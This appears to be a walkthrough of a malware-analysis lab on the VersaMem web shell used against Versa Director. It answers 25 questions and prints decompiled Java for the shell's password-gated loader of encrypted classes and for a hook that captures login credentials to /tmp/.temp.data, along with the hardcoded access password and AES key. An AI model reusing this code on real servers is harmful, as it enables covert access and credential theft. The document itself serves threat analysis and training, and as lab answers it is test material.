# ElectricBreeze-2

>[!note] [Taking the Crossroads: The Versa Director Zero-Day Exploitation](https://blog.lumen.com/uncovering-the-versa-director-zero-day-exploitation/) includes some malware analysis.

## 1 Use MalwareBazaar to download a copy of the file with the hash '4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37'. What is the URL to do this?

Search `sha256:4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37`

> **ANSWER:** `https://bazaar.abuse.ch/download/4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37/`

## 2 What is the password to unlock the zip?

> **ANSWER:** infected

## 3 What is the extension of the file once unzipping?

> **ANSWER:** jar

## 4 What is a suspicious directory in META-INF?

```sh
$ tree META-INF
META-INF/
├── maven/
│   ├── org.example/
│   │   └── Director_tomcat_memShell/
│   │       ├── pom.properties
│   │       └── pom.xml
│   └── org.javassist/
│       └── javassist/
│           ├── pom.properties
│           └── pom.xml
└── MANIFEST.MF
```

> **ANSWER:** `Director_tomcat_memShell`

## 5 One of the files in this directory may give some insight into the threat actor's origin. What is the file?

> **ANSWER:** `pom.xml`

## 6 According to Google Translate, what language is the suspicious text?

Suspicious comment: 检查最新版本

> **ANSWER:** Chinese

## 7 What is the translation in English?

> **ANSWER:** Check for the latest version

## 8 According to this file, what is the application's name?

> **ANSWER:** VersaTest

## 9 The VersaMem web shell works by hooking Tomcat. Which file holds the functionality to accomplish this?

> **ANSWER:** `com/versa/vnms/ui/TestMain.class`

## 10 There is a command that determines the PID for the hook. What is the program used in this line of code?

```java
String[] cmd = new String[]{"/usr/bin/pgrep", "-f", "org.apache.catalina.startup.Bootstrap"};
Process process = Runtime.getRuntime().exec(cmd);
BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
String pid = reader.readLine();
```

> **ANSWER:** pgrep

## 11 The functionality for the webshell is in a different file. What is its name?

`init/WriteTestTransformer.class` has suspicious `getInsertCode()`

> **ANSWER:** `com/versa/vnms/ui/init/WriteTestTransformer.class`

## 12 What is the name of the function that deals with authentication into the webshell?

> **ANSWER:** `getInsertCode`

Code:

```java
{
    String pwd = $1.getParameter("p");
    String accessPwd = "5ea23db511e1ac4a806e002def3b74a1";
    HttpServletRequest httpRequest = (HttpServletRequest) $1;
    HttpServletResponse httpResponse = (HttpServletResponse) $2;
    String authStr = httpRequest.getHeader("Versa-Auth");
    try {
        if (accessPwd.equals(pwd) || accessPwd.equals(authStr)) {
            SecretKeySpec secretKey = new SecretKeySpec(new byte[]{56, 50, 97, 100, 52, 50, 99, 50, 102, 100, 101, 56, 55, 52, 99, 53, 54, 101, 101, 50, 49, 52, 48, 55, 101, 57, 48, 57, 48, 52, 97, 97}, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            String clzn = $1.getParameter("clzn");
            if (clzn == null) {
                clzn = "VersaMem";
            } else {
                byte[] encryptedData = Base64.getDecoder().decode(clzn.getBytes());
                byte[] clznBytes = cipher.doFinal(encryptedData);
                clzn = new String(clznBytes);
            }
            try {
                clazz = Class.forName(clzn, false, classLoader);
            } catch (ClassNotFoundException e) {
                String clzd = $1.getParameter("clzd");
                if (clzd != null) {
                    byte[] encryptedData = Base64.getDecoder().decode(clzd.getBytes());
                    byte[] clazzBytes = cipher.doFinal(encryptedData);
                    java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115}), new Class[]{byte[].class, int.class, int.class});
                    defineClassMethod.setAccessible(true);
                    clazz = (Class) defineClassMethod.invoke(classLoader, new Object[]{clazzBytes, new Integer(0), new Integer(clazzBytes.length)});
                    httpResponse.getWriter().write("R2qBFRx0KAZceVi+MWP6FGGs8MMoJRV5M3KY/GBiOn8=");
                    httpResponse.getWriter().flush();
                    httpResponse.getWriter().close();
                } else {
                    httpResponse.getWriter().write("Q6ajR83GUmjv9aiPylz2pg==");
                    httpResponse.getWriter().flush();
                    httpResponse.getWriter().close();
                }
            }
            if (clazz != null) {
                Constructor constructor = clazz.getConstructor(new Class[]{Object.class, Object.class});
                constructor.newInstance(new Object[]{httpRequest, httpResponse});
            }
            return null;
        }
    } catch (Throwable e) {
        e.printStackTrace(); //remove......
    }
    this.internalDoFilter($1, $2);
}
```

## 13 What request parameter must be present to activate the webshell logic?

> **ANSWER:** p

## 14 What is the hardcoded access password used to validate incoming webshell requests?

> **ANSWER:** 5ea23db511e1ac4a806e002def3b74a1

## 15 What type of encryption is used?

```java
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
```

> **ANSWER:** AES

## 16 What cipher mode is used to encrypt the credentials?

> **ANSWER:** ECB

## 17 What is the key?

```java
SecretKeySpec secretKey = new SecretKeySpec(new byte[]{56, 50, 97, 100, 52, 50, 99, 50, 102, 100, 101, 56, 55, 52, 99, 53, 54, 101, 101, 50, 49, 52, 48, 55, 101, 57, 48, 57, 48, 52, 97, 97}, "AES");
```

> **ANSWER:** 56, 50, 97, 100, 52, 50, 99, 50, 102, 100, 101, 56, 55, 52, 99, 53, 54, 101, 101, 50, 49, 52, 48, 55, 101, 57, 48, 57, 48, 52, 97, 97

## 18 What is the value of the key after decoding?

> **ANSWER:** 82ad42c2fde874c56ee21407e90904aa

## 19 To avoid static detection, the method name is constructed at runtime and passed to java.lang.reflect.Method, what is the decimal byte array used to construct the string name?

```java
java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115}), new Class[]{byte[].class, int.class, int.class});
```

> **ANSWER:** 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115

## 20 What is the Base64-encoded string that is returned to the client if the class is successfully defined?

> **ANSWER:** `R2qBFRx0KAZceVi+MWP6FGGs8MMoJRV5M3KY/GBiOn8=`

## 21 What is the decrypted string?

```python
arr=[56, 50, 97, 100, 52, 50, 99, 50, 102, 100, 101, 56, 55, 52, 99, 53, 54, 101, 101, 50, 49, 52, 48, 55, 101, 57, 48, 57, 48, 52, 97, 97]
"".join([f"{i:x}" for i in arr])
```

[CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false,true)AES_Decrypt(%7B'option':'Hex','string':'3832616434326332666465383734633536656532313430376539303930346161'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=UjJxQkZSeDBLQVpjZVZpK01XUDZGR0dzOE1Nb0pSVjVNM0tZL0dCaU9uOD0)

> **ANSWER:** classDefine by clzd

## 22 There is another class to log passwords for exfiltration. What is this file?

> **ANSWER:** `com/versa/vnms/ui/init/CapturePassTransformer.class`

## 23 What is the main malicious function in this class?

> **ANSWER:** captureLoginPasswordCode

Code:

```java
{
  $_ = $proceed($$);
  String planText = username + " , " + password;
  byte[] dataToEncrypt = planText.getBytes(StandardCharsets.UTF_8);
  SecretKeySpec secretKey = new SecretKeySpec("82ad42c2fde874c56ee21407e90904aa".getBytes(StandardCharsets.UTF_8), "AES");
  Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
  cipher.init(Cipher.ENCRYPT_MODE, secretKey);
  byte[] encryptData = cipher.doFinal(dataToEncrypt);
  String logData = Base64.getEncoder().encodeToString(encryptData);
  String logFile = "/tmp/.temp.data";
  String cmd = "grep -q " + logData + " " + logFile + " || echo " + logData + " >> " + logFile;
  String[] command = { "/bin/bash", "-c", cmd };
  ProcessBuilder processBuilder = new ProcessBuilder(command);
  Process process = processBuilder.start();
  process.waitFor();
}
```

## 24 The same AES key from the previous method is being used. What is the variable name it is being saved as in this function?

> **ANSWER:** secretKey

## 25 What file is used to hold credentials before exfiltration?

> **ANSWER:** `/tmp/.temp.data`

